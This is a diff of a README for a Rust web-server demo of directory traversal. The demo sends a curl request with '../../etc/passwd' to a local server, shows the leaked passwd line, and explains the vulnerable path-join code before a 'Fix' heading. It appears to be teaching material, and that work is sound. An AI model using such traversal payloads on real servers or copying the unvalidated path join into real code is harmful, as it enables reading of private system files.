@@ -1,9 +1,8 @@
-# Demo & notes
+# Demo & notes in Rust 🦀
 
 ```bash
 cargo run
 ```
-
 
 Exploiting the Vulnerability
 The attack vector is identical. Open a new terminal and use curl.
@@ -14,20 +13,16 @@ Bash
 
 curl http://127.0.0.1:8080/static/index.html
 
-
-2. The Attack:
+2.The Attack:
 Now, let's craft our malicious URL. The path structure is the same.
 
 Bash
 
 curl http://127.0.0.1:8080/static/../../etc/passwd
 
-
- Boom! The server again responds with the contents of our simulated /etc/passwd file:
+Boom! The server again responds with the contents of our simulated /etc/passwd file:
 
 root:x:0:0:root:/root:/bin/bash
-
-
 
 ----
 Directory Traversal Under the Hood: The Vulnerable Code
@@ -44,8 +39,6 @@ let filename: String = req.match_info().get("filename").unwrap().to_string();
 //    `public/../../etc/passwd`, which the OS resolves correctly.
 let file_path = PathBuf::from("./public/").join(&filename);
 The root cause is unchanged: the application forwards unvalidated input from the web request directly to a filesystem API.
-
-
 ---
 
 ## The Fix
